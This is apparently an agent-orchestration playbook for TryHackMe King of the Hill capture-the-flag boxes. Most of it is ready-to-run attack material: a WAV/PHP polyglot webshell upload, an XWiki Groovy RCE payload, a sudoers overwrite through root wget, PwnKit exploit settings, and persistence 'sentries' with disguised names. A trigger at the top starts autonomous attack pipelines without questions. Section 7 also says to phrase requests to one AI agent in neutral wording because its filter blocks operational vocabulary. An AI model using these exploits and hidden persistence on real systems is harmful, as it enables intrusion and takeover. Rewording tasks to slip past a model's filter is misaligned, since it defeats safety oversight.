# King of the Hill — playbook

## TRIGGER: `koth:<ip>` — autonomous start

When the prompt is `koth:<ip>` (or `koth <ip>`), start immediately, no questions:

```sh
IP=<parsed-ip>
koth kickoff "$IP" &                                   # recon + intel
python3 ~/test/ctf-tool/ctf.py koth auto "$IP" --json &   # full pipeline
```

In parallel, delegate: `ctf-muse` (recon/intel/CVE mapping), `ctf-codex` (web/app pentest),
and a privesc agent once a foothold exists. Each gets the exact IP, "no reset, keep services",
and a workspace under `~/Projects/KOTH-OPS/state/<ip>/`.

After root: `restore.sh` → `lock_vector.sh` → `guard_install.sh` → `verify.sh`.
Lock the entry vector before celebrating. Report king/root/key/sentries/flags and rule compliance.

Fast, evidence-first workflow for an authorized THM KotH box. Read
`CTF-TOOLS.md` for tool availability and scope rules first. Replace `<IP>`
with the in-scope host. Never touch other hosts, never reset the box, keep
all services running.

## 0. Start (90 seconds, bounded)

```sh
IP=<IP>; S=~/Projects/KOTH-OPS/state/$IP; mkdir -p $S/{loot,recon,logs}
bash ~/Projects/KOTH-OPS/kit/check-env.sh            # preflight once

# 1) quick bounded scan (<=15-45 s; a timeout is NOT unreachable)
nmap -Pn -n --top-ports 2000 -T4 --min-rate 500 --max-retries 1 --host-timeout 45s -oN $S/recon/quick.txt $IP
#    no ports? retry connect scan, then check reachability, never guess a VPN problem:
#    nmap -Pn -n -sT --top-ports 1000 -T4 --max-retries 1 --host-timeout 20s -oN $S/recon/quick.retry.txt $IP

# 2) probe every open port in parallel, save bodies
for p in $(grep -oE '^[0-9]+/tcp' $S/recon/quick.txt | cut -d/ -f1); do
  (curl -sS -m 5 -o $S/loot/b$p.bin -D $S/loot/h$p.txt http://$IP:$p/ 2>/dev/null) &
done; wait

# 3) triage artifacts IMMEDIATELY (binwalk/strings/steghide/append carving)
~/Projects/KOTH-OPS/kit/triage.sh -q --dir $S/loot

# 4) full TCP scan in the background — never blocks
nohup nmap -Pn -n -p- --min-rate 1500 -T3 --max-retries 1 --host-timeout 240s \
  -oN $S/recon/full.txt $IP >/dev/null 2>&1 &

# 5) cred-first matrix (<=3 attempts/service), then web work
```

`koth kickoff <IP>` / `koth recon <IP> [outdir]` still work and now follow the same
bounded profile (quick → background full → all-port HTTP → triage). They are a
convenience, never a gate: if a fresh state dir exists, reuse it.

`koth kickoff` writes `/tmp/opencode/koth-<IP>/kickoff.md` (ports, titles, stack,
FTP pulls, triage hits, visible flags, intel). It is recon-only.

**Rule:** a file on disk is triaged within 30 s, in parallel with scanning.
On 2026-11-03 a deferred image triage cost 150 s (40 % of the run).

## 1. Cheap wins first

- Anonymous FTP: `curl -s ftp://anonymous:anonymous@<IP>/`
  Pull `memo.txt`, `employees.txt`, keys, dumps. `memo.txt` often holds a flag.
- HTTP titles: `curl -s <IP> | grep -i '<title'` for every open web port.
- Directory listing: `/uploads/`, `/database/`, `/backup/`, `/assets/`.
- Exposed DB dump: `/database/*.sql` → crack MD5s offline
  (`hashcat -m 0`, or `john --format=raw-md5`).

## 2. Web foothold

1. `koth recon` already ran ffuf with `web-common`.
2. Read the app name/version, search for known issues: `koth intel "<app> CVE"`.
3. Common KotH paths: `/admin`, `/classes/*.php`, `/database/`, `/uploads/`.
4. Test **unauthenticated** state-changing endpoints before auth bypass:
   `POST /classes/Master.php?f=save_music` accepted uploads with no session.
5. Upload filter bypass recipe (PHP app, MIME checked, extension trusted):
   build WAV+PHP polyglot and send it with `filename=shell.php`:

```python
import struct
d = b'\x00' * 44
fmt = struct.pack('<4sIHHIIHH', b'fmt ', 16, 1, 1, 8000, 8000, 1, 8)
riff = 4 + (8+16) + (8+len(d))
wav = b'RIFF' + struct.pack('<I', riff) + b'WAVE' + fmt + b'data' + struct.pack('<I', len(d)) + d
open('shell_audio.php','wb').write(wav + b'\n<?php system($_GET["cmd"]); ?>\n')
```

```sh
curl -s -X POST 'http://<IP>/classes/Master.php?f=save_music' \
  -F 'id=' -F 'title=x' -F 'artist=x' -F 'category_id=1' -F 'description=x' \
  -F 'audio_file=@shell_audio.php;filename=shell.php;type=audio/wav'
curl -s 'http://<IP>/uploads/audio/shell.php?cmd=id'
```

6. Java/wiki services: XWiki 15.5.2 → CVE-2025-24893 (guest Groovy RCE) via
   `/bin/get/Main/SolrSearch?media=rss&text=...` (note **get**, not view):

```python
import urllib.parse, subprocess
p = '}}}{{async async=false}}{{groovy}}println("cat /root/flag.txt".execute().text){{/groovy}}{{/async}}'
u = "http://<IP>:8080/bin/get/Main/SolrSearch?media=rss&text=" + urllib.parse.quote(p, safe='')
print(subprocess.run(['curl','-s',u], capture_output=True, text=True).stdout)
```

## 3. SSH keys

```sh
ssh2john id_rsa | head -c 80          # fixed Python-3 script (local wrapper)
koth crack id_rsa --fast              # rockyou top-100k, CPU john-ng
koth crack id_rsa                     # full rockyou (slow, see limits)
```

- Find the owner without cracking: SSH with the key; if the server replies
  `PK_OK` and asks for a passphrase, the key is authorized for that user.
- bcrypt-SSH keys are CPU-only: hashcat has no mode, `ssh-opencl` rejects
  cipher 6, and john's OpenMP already saturates all cores (~110 p/s here).
  `--fork` does not help. Prefer targeted lists/intel over full rockyou.
- Restricted shell (`fireshell` etc.): `help` lists allowed commands; try
  `echo $(cmd)` only if that build performs substitution. If not, pivot to
  the web route instead of fighting the shell.

## 4. Privilege escalation

Run through the web shell or SSH:

```sh
id; hostname; uname -a
sudo -n -l
sudo -n -u <user> sudo -n -l        # chained sudo is common
ls -la /home /root 2>&1
cat /etc/crontab /etc/ld.so.preload 2>&1
getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null
docker ps 2>/dev/null
```

Typical KotH chains seen on Fireworks:

- `www-data → (steven) NOPASSWD: ALL` → `steven → (ALL) NOPASSWD: wget`
- `wget -O` as root writes anywhere. Stage the payload in the web root and
  fetch it from `127.0.0.1` so no reverse connectivity is needed:

```sh
echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /var/www/html/uploads/sudoers_pwn
sudo -n -u steven sudo -n /usr/bin/wget -O /etc/sudoers.d/pwn http://127.0.0.1/uploads/sudoers_pwn
sudo -n id
```

- Other paths: `david → (ALL) NOPASSWD: /usr/bin/nmap` (GTFObins), docker
  group, writable cron/systemd units, `ld.so.preload` rootkits (read with a
  static `busybox` if normal tools lie).

## 5. Flags (KotH set)

Always verify on the live box; public writeups may be from another instance.

```sh
sudo -n grep -rIl --binary-files=without-match 'THM{' /home /root /opt /srv /var/www /var/backups /tmp 2>/dev/null
sudo -n cat /root/root.txt
for f in /home/*/*.txt; do echo "-- $f"; sudo -n cat "$f"; done
```

Common locations:

| Flag | Path |
|---|---|
| FTP | `/srv/ftp/memo.txt` |
| root | `/root/root.txt` |
| users | `/home/<user>/<user>.txt` |
| container service | `docker exec <c> cat /root/flag.txt` |
| king | `/root/king.txt` |

Also check the DBs (MySQL dump, Postgres in containers) and all Docker
containers; a randomized service usually carries its own flag.

## 6. Take and hold the hill

- The checker is often a small Flask app on an odd port returning
  `/root/king.txt` for every path (here port 9999, `/root/koth`).
- Write the exact THM username, then verify through the checker:

```sh
echo '<thm_username>' | sudo -n tee /root/king.txt
curl -s http://<IP>:9999/
```

- Do not restart or break the checker. Optionally protect with
  `chattr +i /root/king.txt`, but remember other root players can clear it.

## 7. Team run (parallel agents)

Split independent work so the box is covered in parallel:

- `codex` (codex_relay) — web app / upload / privesc chain (primary) + independent verifier (fresh thread).
- `agy` (agy_relay) — intel, credential work, neutral wording (its filter blocks operational vocabulary).
- `zcode` (zcode_relay) — independent verification with the user's selected model.

Delegation discipline (learned 2026-11-03, session `koth:10.10.153.63` — see
`~/Projects/CTF_Orchestrator/RELAY-RETRO-2026-11-03.md`):

1. **workspace is always an explicit small task directory** (e.g.
   `.../KOTH-OPS/state/<ip>/`), never `.`, home or a project root. The CLI
   refuses home and anything over 1 GB (`DEFEX_WORKSPACE_MAX_MB`), but the
   right fix is passing the task dir in the first place.
2. **Parallelize different work, not copies of recon.** One recon, one
   exploit front, one privesc — never three agents on the same vector.
3. **Directives only to a RUNNING delegation** (`session=<childID>`; queued and
   applied in the same thread). A thread that finished successfully is closed —
   the CLI refuses `resume` on it; start a fresh delegation with only the delta.
   (Exception: answering an open QUESTION resumes its thread; queued directives
   pass `--new-task` automatically.)
4. **Receipt first, conclusions second.** A milestone (root shell, flag, shell
   on target) is an unverified lead mined from the agent's prose — verify
   against the receipt and live evidence before acting or reporting. Truth =
   `ps` + `receipt.json`, never UI rows.
5. Model in a receipt is **configured, not provider-attested**.
6. After each delegation the CLI auto-prunes that run's workspace copies;
   `defex-ctf prune [--keep-days N]` cleans everything older. If you need files
   the delegate produced, pass `sync_artifacts=true`.
7. **Every prompt carries the contract**: exact ports already known, "do NOT run
   `koth kickoff`/`recon`" (duplicate recon banned), artifact path in the shared
   state dir, "download a service file once, then work locally", "≤3 credential
   attempts per service", read-only, never write `/root/king.txt`.
8. **Consume, don't duplicate.** Poll the shared workspace every 30–60 s
   (`find <state> -type f -newermt '-2 minutes'`, `ls -lt`). Read what the agent
   already produced before redoing its front; on 10.10.205.72 a teammate's
   `creds.txt` sat unread for 85 s while the same credential was re-derived.
9. **Relay call hygiene**: `session=` always together with `workspace=`, one
   relay call at a time (parallel blocks abort), and read the receipt as
   `.attempts[]` — `status/client/model/duration_seconds` — not the UI row.
10. **Mission contract (A–H)**: never improvise a brief. Generate it:
   ```sh
   python3 ~/Projects/KOTH-OPS/kit/delegate/mission.py --ip <IP> --state <state> \
     --front <name> --role extractor|prober|researcher|verifier \
     --ports "<exclusive ports>" --goal "<one decision>" --deadline 120 \
     --artifacts "<local files to triage first>"
   ```
   It enforces: one decision + one artifact + deadline (A), board + INBOX
   incremental delivery (B), `claim`-based deconfliction (C), roles/time boxes
   with the critical path kept by the parent (D), `QUESTION`-without-blocking and
   kill criteria (E), JSON result line and no secrets in prose (F), one download
   / no `-p-` / one port set (G), and `board.py metrics` for grading (H).

Give every child: exact scope (only `<IP>`), workspace, concrete goal, "do not
write `/root/king.txt`", and "keep services alive". Watch progress in the TUI
Subagents panel (down arrow; `ctrl+a` toggles finished runs) — child titles show
`▸ running`, `✓ success`, `✗ error`:

```sh
teamctl list --children
teamctl tree <parent-session>
teamctl tail <child-session> -n 20
defex-ctf receipt <run-id>          # ground truth for any delegation
```

Or use the batch template: `defex-ctf batch examples/koth-parallel.yaml --verify`.

## 8. Tool cheat sheet

| Command | Purpose |
|---|---|
| `koth doctor` | environment/GPU/wordlist check |
| `koth quickstart <IP>` | 90-second runbook: quick scan → probes → triage → bg full scan |
| `koth triage <file/--dir D>` | immediate artifact triage (binwalk/strings/steghide/carve) |
| `koth guard <IP> <king> <pubkey>` | install + tamper-test the king guard on a target |
| `koth recon <IP> [dir]` | bounded ports + FTP + all-port HTTP + ffuf + triage |
| `koth intel "query"` | DuckDuckGo search (POST; websearch is broken) |
| `koth crack <key> [list] [--fast]` | ssh2john + john-ng |
| `koth loot -u <cmd-url>` | read-only loot checklist via web shell |
| `hashcat-gpu` | alias for hashcat (system OpenCL ICD installed) |
| `john-gpu` / `john-ng` | bleeding-jumbo with OpenCL |
| `ctf-doctor` | full tool inventory incl. wrappers/GPU |

## 9. Pitfalls

- **All 65535 ports filtered ≠ dead box.** It is almost always rate-limit/IPS
  (seen with `-T4 --min-rate 4000`). Retry `KOTH_MINRATE=800` before concluding
  anything; the failure cost 66 s and a false "target down".
- **VPN is the user's.** If the target is unreachable and `tun0` is absent, say
  "VPN is down" and stop; the user starts it. Never start/stop it yourself, and
  never move T0 to hide the wait (a self-started VPN detour cost 3.5 min).
- **`-sC` / `--version-all` hangs on telnet IAC.** Bound it: `-sV --version-light
  --version-timeout`/`--host-timeout 90s`; probe telnet with `kit/telnet_probe.py`.
- **Artifact-first.** Any image/blob/archive that lands on disk is triaged with
  `kit/triage.sh` at once (binwalk, strings, exiftool, `steghide -p ''`, appended
  gzip/zip/tar carving). Deferring it was the single biggest delay on a recent KotH run.
- **`pkill -f` self-kill.** A pattern that also appears in your own command line
  kills your shell (happened twice). Use `pgrep -x nmap | xargs -r kill`.
- **`ls -la` does not show `chattr +i`.** Verify with `lsattr`; install the guard
  (5 s loop) before the cron-only version.
- **Timezone trap.** Target logs are UTC while local may be UTC+2 — `last`/`who`
  rows can look like a competitor when they are your own agent.
- **No `sshpass`.** Use `kit/sshp.py` (paramiko) for password SSH; check once in
  preflight.
- **Team artifacts beat your own duplicate work.** Poll the shared state dir
  (`find <state> -newermt '-2 minutes'`) every 30–60 s; on 10.10.205.72 a
  teammate's credential sat unread for 85 s.
- Box services are randomized per boot; the writeup's 8443 Magento may be
  your 8080 XWiki. Fingerprint, don't assume.
- A passphrase or flag from a writeup must be verified against the live key
  or file before reporting.
- Do not paste the same exploit blindly: the distro `ssh2john` is broken,
  hashcat cannot do bcrypt SSH keys, and `john --fork` oversubscribes.
- Keep a timeline: endpoint, credential, flag path, command/output.

## 10. Reference run

Full Fireworks writeup with exact commands and evidence:
`~/koth-fireworks-writeup.md`

## 11. V2 pointers

Full playbook: `~/Projects/KOTH-OPS/PLAYBOOK-V2.md`
Kits: `kit-capture/` (discover, capture, lock, writer), `kit-guard/`
(sentries + installer), `kit-retake/` (90 s retake driver).

- **Lock before celebrating.** After first root, spend the next 60 s replacing
  the root-executed writable file with a root-owned immutable stub, then remove
  `sudoers.d`/SUID alternates, then king/key/sentries. An unclosed vector is a
  rental, not a hold.
- **Config first.** Copy `kit-*/koth.conf.example` → `koth.conf`; set `TARGET`,
  `CHECKER_URL`, `EXPECT_KING` (exact bytes, no newline), `STAGE_DIR` (not
  `/tmp`), `FOOTHOLD_CMD`, `ROOT_CRON_TARGET`, `OUR_PUBKEY`, `ENEMY_PATTERNS`.
  Dry-run before contact: `./capture.sh --config koth.conf --dry-run`.
- **Discover, don't re-derive.** `discover.sh` ranks sudo SETENV (5 s) >
  SUID/caps (10 s) > pkexec (15 s) > PATH (30 s) > cron/systemd (60 s). 60 s
  per vector, then move on.
- **Sentry design.** Neutral names (`.sysmon`/`.svcwatch`, never `koth*`,
  `guard`, `king`, `hill*`); 0.2 s guard + 0.5 s watchdog; systemd
  `Restart=always` + `/etc/cron.d` fallback + root-cron stub; append-only log
  (`chattr +a`); bracket `pkill` patterns (`koth[g]uard`) — never bare names.
- **Race engineering.** Write cron targets with tmp + `rename` at 4–8 ms. If it
  still loses, find and stop the rewriter process (`ps`/`fuser`/`lsof` on the
  target); rewriting the file cannot beat the process rewriting it. Immutable
  target = stop, switch vector.
- **PwnKit fallback.** `args={NULL}`, `environ[0]="pwnkit.so:."`,
  `PATH=GCONV_PATH=.`, `SHELL=<non-existent>`, `CHARSET=PWNKIT`, plus the
  `GCONV_PATH=.` directory and the `/bin/true` dummy. Absolute paths inside
  `gconv_init` — the minimal gconv `PATH` is why `touch` "not found".
  `kit/pwnkit.c` takes the king name and pubkey from `KOTH_KING_NAME` /
  `KOTH_KING_PUBKEY` at run time (nothing hardcoded; unset variable → that
  action is skipped) — export both in the shell that runs the exploit.
- **Compliance.** No reset, no checker/scoring tampering, no DoS/fork storms,
  no app patching, no password/sshd changes, no service disabling, no firewall,
  keys append-only, scope = the one assigned host.
- **Budgets.** Recon 20 s; first root ≤ 3 min; lock ≤ 60 s after root; stable
  crown ≤ 5 min; retake ≤ 90 s; losses ≤ 1/h. Verify with `id` and the checker,
  never with an exploit's exit code.
